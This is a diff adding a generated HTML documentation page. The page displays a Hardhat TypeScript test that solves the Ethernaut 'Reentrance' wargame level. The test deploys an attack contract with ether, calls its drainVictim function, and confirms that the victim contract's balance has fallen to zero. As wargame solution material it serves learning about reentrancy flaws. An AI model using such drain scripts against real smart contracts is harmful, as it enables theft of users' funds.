@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>10_Reentrance.ts</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>10_Reentrance.ts</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, providers, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x848fb2124071146990c7abE8511f851C7f527aF4&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x6b7A65160550C15d92414F707022dd8c094B2aef&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;10 Reentrance&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">attack</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">provider</span>: providers.<span class="hljs-property">Provider</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Reentrance&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+    provider = signer.<span class="hljs-property">provider</span>
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;deploys attack contract with ether&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> factory = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&#x27;ReentranceAttack&#x27;</span>)
+    attack = <span class="hljs-keyword">await</span> factory.<span class="hljs-title function_">deploy</span>(instance.<span class="hljs-property">address</span>, {
+      <span class="hljs-attr">value</span>: ethers.<span class="hljs-property">utils</span>.<span class="hljs-title function_">parseEther</span>(<span class="hljs-string">&#x27;0.2&#x27;</span>),
+      <span class="hljs-attr">gasLimit</span>: <span class="hljs-number">1000000</span>,
+    })
+    <span class="hljs-keyword">await</span> attack.<span class="hljs-property">deployTransaction</span>.<span class="hljs-title function_">wait</span>()
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;executes attack&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> attack.<span class="hljs-title function_">drainVictim</span>()
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies instance has zero balance&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getBalance</span>(instance.<span class="hljs-property">address</span>)).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(<span class="hljs-number">0</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
